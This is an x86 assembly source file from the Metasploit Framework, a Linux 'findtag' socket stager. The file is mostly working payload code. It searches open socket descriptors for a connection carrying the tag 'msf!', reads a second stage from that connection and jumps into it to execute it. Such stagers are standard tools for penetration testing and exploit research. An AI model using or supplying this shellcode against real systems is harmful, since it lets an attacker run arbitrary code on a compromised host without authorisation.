;;
; 
;        Name: stager_sock_find
;   Qualities: Nothing Special
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1512 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux findsock TCP stager.
;
;        File descriptor in edi
;
; Meta-Information:
;
; meta-shortname=Linux FindTag Stager
; meta-description=Run a second stage from an established connection
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=findtag
; meta-name=find
; meta-basemod=Msf::PayloadComponent::FindConnection
; meta-offset-findtag=0x1a
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx

initialize_stack:
	push ebx
	mov  esi, esp
	push byte 0x40
	mov  bh, 0xa
	push ebx
	push esi
	push ebx
	mov  ecx, esp
	xchg bh, bl

findtag:
	inc  word [ecx]
	push byte 0x66
	pop  eax
	int  0x80
	cmp  dword [esi], 0x2166736d ; tag: msf!
	jnz  findtag
	pop  edi

%ifndef USE_SINGLE_STAGE
jumpstage:
	cld
	lodsd
	jmp  esi
%endif
